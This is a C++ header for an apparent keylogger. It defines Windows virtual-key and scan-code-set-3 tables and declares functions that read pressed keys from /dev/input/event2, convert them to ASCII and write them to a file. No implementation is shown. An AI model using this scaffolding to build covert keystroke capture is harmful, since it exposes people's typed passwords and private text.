#ifndef KEYLOG_H
#define KEYLOG_H

#include <vector>
#include <string>

// Definitely Windows specific
enum vcodes {VC_BACK = 0x08, VC_TAB, VC_CLEAR = 0x0C, VC_RETURN, VC_SHIFT = 0x10, VC_CONTROL,
    VC_MENU, VC_PAUSE, VC_CAPITAL, VC_ESCAPE = 0x1B, VC_SPACE = 0x20, VC_PRIOR, VC_NEXT, VC_END,
    VC_HOME, VC_LEFT, VC_UP, VC_RIGHT, VC_DOWN, VC_SELECT, VC_PRINT, VC_EXECUTE, VC_SNAPSHOT,
    VC_INSERT, VC_DELETE, VC_HELP, VC_0, VC_1, VC_2, VC_3, VC_4, VC_5, VC_6, VC_7, VC_8, VC_9,
    VC_A = 0x41, VC_B, VC_C, VC_D, VC_E, VC_F, VC_G, VC_H, VC_I, VC_J, VC_K, VC_L, VC_M, VC_N,
    VC_O, VC_P, VC_Q, VC_R, VC_S, VC_T, VC_U, VC_V, VC_W, VC_X, VC_Y, VC_Z, VC_LWIN, VC_RWIN,
    VC_APPS, VC_SLEEP = 0x5F, VC_NUMPAD0, VC_NUMPAD1, VC_NUMPAD2, VC_NUMPAD3, VC_NUMPAD4,
    VC_NUMPAD5, VC_NUMPAD6, VC_NUMPAD7, VC_NUMPAD8, VC_NUMPAD9, VC_MULTIPLY, VC_ADD,
    VC_SEPARATOR, VC_SUBTRACT, VC_DECIMAL, VC_DIVIDE, VC_OEM_1 = 0xBA /*';:'*/,
    VC_OEM_PLUS /*'+'*/, VC_OEM_COMMA /*','*/, VC_OEM_MINUS /*'-'*/, VC_OEM_PERIOD /*'.'*/,
    VC_OEM_2 /*'/?'*/, VC_OEM_3 /*'`~'*/, VC_OEM_4 = 0xDB /*'[{'*/, VC_OEM_5 /*'\|'*/,
    VC_OEM_6 /*']}'*/, VC_OEM_7 /*''"'*/, VC_OEM_8 /*'IDK'*/, VC_OEM_CLEAR = 0xFE, END};

 // Definitely Linux specific
enum set3 {SET3_BACK = 0x66, SET3_TAB = 0x0D, SET3_RETURN = 0x5A, SET3_LSHIFT = 0x12, SET3_RSHIFT = 0x59,
    SET3_LCONTROL = 0x11, SET3_RCONTROL = 0x14, SET3_LALT = 0x19, SET3_RALT = 0x39, SET3_PAUSE = 0x62,
    SET3_CAPITAL = 0x58, SET3_ESCAPE = 0x08, SET3_SPACE = 0x29, SET3_END = 0x65, SET3_HOME = 0x6E,
    SET3_LEFT = 0x61, SET3_UP = 0x63, SET3_RIGHT = 0x6A, SET3_DOWN = 0x6D, SET3_PRINT = 0x57,
    SET3_INSERT = 0x67, SET3_DELETE = 0x64, SET3_0 = 0x45, SET3_1 = 0x16, SET3_2 = 0x1E, SET3_3 = 0x26,
    SET3_4 = 0x25, SET3_5 = 0x2E, SET3_6 = 0x36, SET3_7 = 0x3D, SET3_8 = 0x3E, SET3_9 = 0x46, SET3_A = 0x1C,
    SET3_B = 0x32, SET3_C = 0x21, SET3_D = 0x23, SET3_E = 0x24, SET3_F = 0x2B, SET3_G = 0x34, SET3_H = 0x33,
    SET3_I = 0x43, SET3_J = 0x3B, SET3_K = 0x42, SET3_L = 0x4B, SET3_M = 0x3A, SET3_N = 0x31, SET3_O = 0x44,
    SET3_P = 0x4D, SET3_Q = 0x15, SET3_R = 0x2D, SET3_S = 0x1B, SET3_T = 0x2C, SET3_U = 0x3C, SET3_V = 0x2A,
    SET3_W = 0x1D, SET3_X = 0x22, SET3_Y = 0x35, SET3_Z = 0x1A, SET3_NUMPAD0 = 0x70, SET3_NUMPAD1 = 0x69,
    SET3_NUMPAD2 = 0x72, SET3_NUMPAD3 = 0x7A, SET3_NUMPAD4 = 0x6B, SET3_NUMPAD5 = 0x73,
    SET3_NUMPAD6 = 0x74, SET3_NUMPAD7 = 0x6C, SET3_NUMPAD8 = 0x75, SET3_NUMPAD9 = 0x7D,
    SET3_MULTIPLY = 0x7E, SET3_ADD = 0x7C, SET3_SEPARATOR = 0x53, SET3_SUBTRACT = 0x84,
    SET3_DECIMAL = 0x71, SET3_DIVIDE = 0x77, SET3_OEM_1 = 0x4C /*';:'*/, SET3_OEM_PLUS = 0x55/*'+'*/,
    SET3_OEM_COMMA = 0x41/*','*/, SET3_OEM_MINUS = 0x4E/*'-'*/, SET3_OEM_PERIOD = 0x49/*'.'*/,
    SET3_OEM_2  = 0x4A/*'/?'*/, SET3_OEM_3 = 0x0E/*'`~'*/, SET3_OEM_4 = 0x54 /*'[{'*/,
    SET3_OEM_5 = 0x5C/*'\|'*/, SET3_OEM_6 = 0x5B/*']}'*/, SET3_OEM_7 = 0x52/*''"'*/,
    SET3_OEM_8 = 0x00/*'IDK'*/};
// Maybe Windows specific


std::vector<vcodes> getPressedKeyboardState(std::string path = "/dev/input/event2");
std::string getAscii(std::vector<vcodes>);

// Generic

void writeToFile(std::string, std::string);

#endif